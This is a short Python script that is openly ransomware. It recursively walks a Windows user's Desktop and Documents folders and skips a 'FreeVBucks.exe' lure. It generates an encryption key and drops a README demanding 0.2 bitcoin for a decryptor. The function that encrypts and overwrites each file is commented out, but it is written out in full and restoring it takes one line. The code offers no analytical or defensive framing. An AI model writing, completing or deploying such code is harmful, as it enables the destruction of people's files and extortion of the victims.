import os
import getpass as gt
from cryptography.fernet import Fernet


def main():
    username = gt.getuser()
    directories = [f'C:\\Users\\{username}\\Desktop', f'C:\\Users\\{username}\\Documents']
    key = Fernet.generate_key()
    f = Fernet(key)

    loop(directories, f)
    write_readme(username, key.decode())


def loop(directories: list[str], f: Fernet):
    aux_directories = []
    while len(directories) != 0:
        for directory in directories:
            if os.path.exists(directory) and os.path.isdir(directory):
                for file in os.listdir(directory):
                    if file == "FreeVBucks.exe":
                        continue
                    if os.path.isfile(directory + "\\" + file):
                        read(directory + "\\" + file, f)
                    if os.path.isdir(directory + "\\" + file):
                        aux_directories.append(directory + "\\" + file)
        directories.clear()
        directories = aux_directories.copy()
        aux_directories.clear()


def read(file_path: str, f: Fernet):
    with open(file_path, "rb") as file:
        content = file.read()
    # magic(content, file_path, f)


# def magic(content, file_path: str, f: Fernet):
#     e_content = f.encrypt(content)
#     with open(file_path, "wb") as file:
#         file.write(e_content)


def write_readme(username: str, key: str):
    with open(f'C:\\Users\\{username}\\Desktop\\README.txt', "w") as file:
        file.write(
            f'Your files have been encrypted, send 0.2 bitcoin to my bank account, and I will give you the decryptor. KEY: {key}')


if __name__ == "__main__":
    main()
